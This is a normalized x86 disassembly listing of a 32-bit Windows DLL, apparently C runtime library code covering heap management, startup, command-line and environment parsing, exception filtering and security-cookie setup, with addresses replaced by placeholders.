mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
cmp ebx ecx
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_10007713
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
cmp ebx ecx
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_10007663
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_10007ddb
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x4 ]
xor esi esi
push eax
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] esi
call sub_10007fad
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call sub_10007fe4
test eax eax
pop ecx
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10004870
add esp 0x14
cmp [ ebp - 0x4 ] 0x2
pop esi
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10004870
add esp 0x14
push 0x3
pop eax
leave
retn
cmp [ ebp - 0x8 ] 0x5
jb r-xdata
xor eax eax
inc eax
leave
retn
sub_10007e36
xor eax eax
cmp [ esp + 0x4 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
call sub_10007ddb
cmp eax 0x3
mov [ rw-data ] eax
jne r-xdata
xor eax eax
retn
xor eax eax
inc eax
retn
push 0x3f8
call sub_100072dc
test eax eax
pop ecx
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
jmp r-xdata
sub_10007e90
push ebp
xor ebp ebp
cmp [ rw-data ] 0x3
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
mov [ rw-data ] ebp
pop ebp
retn
push ebx
mov ebx [ HeapFree@IAT ]
push edi
xor edi edi
cmp [ rw-data ] ebp
jle r-xdata
push [ rw-data ]
push ebp
push [ rw-data ]
call ebx
pop edi
pop ebx
push esi
mov esi [ rw-data ]
add esi 0x10
push 0x8000
push ebp
push [ esi - 0x4 ]
call [ VirtualFree@IAT ]
push [ esi ]
push ebp
push [ rw-data ]
call ebx
add esi 0x14
inc edi
cmp edi [ rw-data ]
jl r-xdata
pop esi
sub_10007f8d
push esi
mov esi [ esp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ esp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_10007fad
mov ecx [ esp + 0x4 ]
push esi
xor esi esi
cmp ecx esi
jne r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
call sub_100049cb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
push 0x16
pop eax
pop esi
retn
mov [ ecx ] eax
xor eax eax
pop esi
retn
sub_10007fe4
mov eax [ esp + 0x4 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
cmp [ rw-data ] esi
je r-xdata
call sub_100049cb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
push 0x16
pop eax
pop esi
retn
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop esi
retn
sub_10008020
cmp [ r--data ] 0x0
je r-xdata
call sub_1000ac66
push r--data
push r--data
call sub_10007f8d
test eax eax
pop ecx
pop ecx
jne r-xdata
push r--data
call sub_1000bbb2
test eax eax
pop ecx
je r-xdata
retn
push esi
push edi
push sub_100089c0
call sub_1000cc2d
mov esi r--data
mov eax esi
mov edi r--data
cmp eax edi
pop ecx
jae r-xdata
push [ esp + 0x4 ]
call [ r--data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_1000bbb2
test eax eax
pop ecx
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_100080b2
push 0xc
push r--data
call sub_10005acc
push 0x8
call sub_100072ab
pop ecx
and [ ebp - 0x4 ] 0x0
xor esi esi
inc esi
cmp [ rw-data ] esi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000816b
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] esi
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_10005b11
retn
mov [ rw-data ] esi
push 0x8
call sub_100071d3
pop ecx
push [ ebp + 0x8 ]
call sub_10007f4e
push r--data
mov eax r--data
call sub_10007f75
pop ecx
push [ rw-data ]
call sub_10004320
mov edi eax
push [ rw-data ]
call sub_10004320
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_10007f75
pop ecx
sub [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x1c ] edi
jb r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call eax
jmp r-xdata
sub_100081a0
push esi
call sub_10004317
mov esi eax
push esi
call sub_100083c5
push esi
call sub_1000ba53
push esi
call sub_10004866
push esi
call sub_1000ce9d
push esi
call sub_1000ce93
push esi
call sub_1000cc89
push esi
call sub_100089e4
push esi
call sub_1000cc78
push sub_10008180
call sub_100042b4
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_100081ec
push ecx
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
xor esi esi
xor edi edi
cmp edi 0x17
jae r-xdata
inc edi
cmp edi 0x17
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
retn
push ebp
push 0x3
call sub_1000d045
cmp eax 0x1
pop ecx
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebp eax
cmp ebp esi
je r-xdata
push 0x3
call sub_1000d045
test eax eax
pop ecx
jne r-xdata
pop ebp
cmp ebp 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ esp + 0x14 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_10004ac0
pop ecx
push eax
push [ esi ]
push ebp
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov ebp rw-data
push ebp
call sub_10009649
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10004870
add esp 0x14
push esi
call sub_10004ac0
inc eax
cmp eax 0x3c
pop ecx
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_10009649
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_10004ac0
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_10009596
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10004870
add esp 0x14
push [ edi * 8 + rw-data ]
push ebx
push ebp
call sub_100094db
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10004870
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_10004870
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push ebp
call sub_1000cea7
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10004870
add esp 0x14
push r--data
push ebx
push ebp
call sub_100094db
add esp 0xc
test eax eax
je r-xdata
sub_1000838c
push 0x3
call sub_1000d045
cmp eax 0x1
pop ecx
je r-xdata
push 0xfc
call sub_100081ec
push 0xff
call sub_100081ec
pop ecx
pop ecx
push 0x3
call sub_1000d045
test eax eax
pop ecx
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_100083cf
push [ rw-data ]
call sub_10004320
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
xor eax eax
inc eax
retn
sub_10008400
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_10008468
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
cmp eax 0xffffffff
mov esi eax
jne r-xdata
or eax 0xffffffff
push [ esp + 0xc ]
call sub_100033fd
mov edi eax
test edi edi
pop ecx
jne r-xdata
sub_100084a8
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
cmp eax 0xffffffff
mov esi eax
jne r-xdata
or eax 0xffffffff
push 0x0
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_1000d08b
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_100084f0
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
retn
cmp [ esp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
cmp eax 0xffffffff
mov esi eax
jne r-xdata
or eax 0xffffffff
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_1000d1a9
mov edi eax
test edi edi
pop ecx
pop ecx
jne r-xdata
sub_1000853b
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
cmp esi ebx
jne r-xdata
call sub_10003f90
mov al [ esi ]
cmp al bl
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_100084a8
mov edi eax
cmp edi ebx
pop ecx
pop ecx
mov [ rw-data ] edi
je r-xdata
pop edi
pop esi
pop ebx
retn
push esi
call sub_10004ac0
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebp
jmp r-xdata
cmp [ esi ] bl
jne r-xdata
push esi
call sub_10004ac0
mov ebp eax
inc ebp
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_100063a9
mov [ rw-data ] ebx
mov [ edi ] ebx
mov [ rw-data ] 0x1
xor eax eax
add esi ebp
push 0x1
push ebp
call sub_100084a8
cmp eax ebx
pop ecx
pop ecx
mov [ edi ] eax
je r-xdata
push [ rw-data ]
call sub_100063a9
mov [ rw-data ] ebx
or eax 0xffffffff
jmp r-xdata
push esi
push ebp
push eax
call sub_10009649
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebp
add edi 0x4
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10004870
add esp 0x14
sub_10008616
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
cmp [ ebp + 0x8 ] eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_1000546f
test eax eax
pop ecx
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
test bl bl
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
test eax eax
pop esi
pop ebx
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
test edx edx
movsx eax al
push eax
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_1000546f
test eax eax
pop ecx
je r-xdata
call sub_1000546f
test eax eax
pop ecx
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_100087ae
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
cmp eax ebx
mov [ rw-data ] esi
je r-xdata
call sub_10003f90
mov [ ebp - 0x4 ] esi
cmp [ eax ] bl
mov [ ebp - 0x4 ] eax
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_10008616
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_10008468
mov esi eax
cmp esi ebx
pop ecx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_10008616
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_10008867
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
push esi
push edi
mov edi [ GetEnvironmentStringsW@IAT ]
xor ebx ebx
xor esi esi
cmp eax ebx
push 0x2
pop ebp
jne r-xdata
cmp eax 0x1
jne r-xdata
call edi
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebp
je r-xdata
cmp esi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call edi
mov esi eax
cmp esi ebx
jne r-xdata
mov eax [ rw-data ]
mov eax ebp
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov edi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax esi
push ebx
sar eax 0x1
inc eax
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
add eax ebp
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
sub eax esi
inc eax
mov ebp eax
push ebp
call sub_10008468
mov edi eax
cmp edi ebx
pop ecx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_10008468
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
add eax ebp
cmp [ eax ] bx
jne r-xdata
push ebp
push esi
push edi
call sub_10006dd0
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_100063a9
pop ecx
mov [ esp + 0x10 ] ebx
sub_1000899c
push esi
push edi
mov eax r--data
mov edi r--data
cmp eax edi
mov esi eax
jae r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
sub_100089c0
push esi
push edi
mov eax r--data
mov edi r--data
cmp eax edi
mov esi eax
jae r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
sub_100089e5
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_100044a7
mov esi eax
test esi esi
jne r-xdata
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
jmp r-xdata
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
pop esi
leave
retn
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
jmp r-xdata
mov ebx [ eax + 0x8 ]
test ebx ebx
mov [ ebp - 0x4 ] ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
cmp eax 0xc000008e
mov edi [ esi + 0x64 ]
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_10008b6f
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
cmp eax edi
mov ebx 0xffff0000
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_10008c10
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_1000d41b
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_10008ca5
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
cmp [ rw-data ] ebx
push edi
mov esi ecx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
